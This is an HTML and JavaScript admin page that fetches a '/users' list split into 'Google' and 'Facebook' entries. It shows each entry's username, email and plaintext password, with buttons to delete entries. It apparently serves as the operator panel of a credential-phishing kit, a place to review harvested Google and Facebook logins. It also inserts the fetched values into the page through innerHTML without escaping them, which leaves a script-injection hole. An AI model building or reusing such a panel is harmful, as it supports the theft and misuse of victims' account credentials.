<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="flex flex-col h-screen w-full justify-start items-center">

    <div class="flex flex-col justfy-center items-center min-w-[98%] min-h-[120px] border-1px p-2 m-2 border-[1px] border-gray-400 rounded-xl">
        <span class="flex flex-row justify-end items-center w-full h-auto">
            <button
                class="flex flex-col justify-center items-center rounded-full w-[2rem] h-[2rem] hover:bg-gray-300 bg-transparent"
                id="ref"
            >
                <svg xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 640 640"><!--!Font Awesome Free v7.3.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2026 Fonticons, Inc.-->
                    <path
                        d="M320 128C263.2 128 212.1 152.7 176.9 192L224 192C241.7 192 256 206.3 256 224C256 241.7 241.7 256 224 256L96 256C78.3 256 64 241.7 64 224L64 96C64 78.3 78.3 64 96 64C113.7 64 128 78.3 128 96L128 150.7C174.9 97.6 243.5 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C233 576 156.1 532.6 109.9 466.3C99.8 451.8 103.3 431.9 117.8 421.7C132.3 411.5 152.2 415.1 162.4 429.6C197.2 479.4 254.8 511.9 320 511.9C426 511.9 512 425.9 512 319.9C512 213.9 426 128 320 128z" />
                </svg>

            </button>
        </span>
        <div class="w-full h-full" id="users"></div>
    </div>
    <script>
        function id(i) {
            return document.getElementById(i);
        }
        const users = id("users");
        const refresh = id("ref");
        document.addEventListener("DOMContentLoaded",addUsers);
        ref.addEventListener("click",addUsers);
        async function addUsers(){
            const request = await fetch("/users");
            const data = await request.json();
            const facebook = data.facebook;
            const google = data.google;
            users.innerHTML="";
            let nn = 0;
            for(let i = 0;i<google.length;i++){
                nn+=i;
                const user = document.createElement("div");
                const email = document.createElement("p");
                const type = document.createElement("p");
                const username = document.createElement("p");
                const password = document.createElement("p");
                const number = document.createElement("p");
                const span = document.createElement("span");
                const delete_btn = document.createElement("button");
                span.className="w-full flex flex-col justify-start items-end";
                delete_btn.innerHTML="Delete";
                span.appendChild(delete_btn);
                delete_btn.addEventListener("click",async()=>{
                    await Delete(google[i]._id,"Google");
                });
                number.innerHTML=`Number: ${(facebook.length+google.length)-(users.children.length+1)+1}`;
                type.innerHTML="Type: Google";
                user.className="flex flex-col p-2 m-2 border-b-[1px] border-gray-300 justify-center items-end w-full min-h-[5rem]";
                password.innerHTML=`Password: "${google[i].password}"`;
                username.innerHTML=`Username: "${google[i].username}"`;
                email.innerHTML=`Email: "${google[i].email}"`;
                user.appendChild(number);
                user.appendChild(type);
                user.appendChild(username);
                user.appendChild(email);
                user.appendChild(password);
                user.appendChild(span);
                user.id=google[i]._id;
                users.appendChild(user);
            }
            for(let i = 0;i<facebook.length;i++){
                nn+=i;
                const user = document.createElement("div");
                const email = document.createElement("p");
                const type = document.createElement("p");
                const username = document.createElement("p");
                const password = document.createElement("p");
                const number = document.createElement("p");
                const span = document.createElement("span");
                const delete_btn = document.createElement("button");
                span.className="w-full flex flex-col justify-start items-end";
                delete_btn.innerHTML="Delete";
                span.appendChild(delete_btn);
                delete_btn.addEventListener("click",async()=>{
                    await Delete(facebook[i]._id,"Facebook");
                });
                number.innerHTML=`Number: ${(facebook.length+google.length)-(users.children.length+1)+1}`;
                type.innerHTML="Type: Facebook";
                user.className="flex flex-col p-2 m-2 border-b-[1px] border-gray-300 justify-center items-end w-full min-h-[5rem]";
                password.innerHTML=`Password: "${facebook[i].password}"`;
                username.innerHTML=`Username: "${facebook[i].username}"`;
                email.innerHTML=`Email: "${facebook[i].email}"`;
                user.appendChild(number);
                user.appendChild(type);
                user.appendChild(username);
                user.appendChild(email);
                user.appendChild(password);
                user.appendChild(span);
                console.log(facebook[i]);
                user.id=facebook[i]._id;
                users.appendChild(user);
            }
       }
       async function Delete(id,type){
        console.log(id);
            console.log(type);
            const req = await fetch("/delete",{
                method: 'DELETE',
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    type: type,
                    id: id
                })
            });
            const data = await req.json();
            document.getElementById(id).remove();
            console.log(data.success);
            addUsers();
       }
    </script>
</body>

</html>
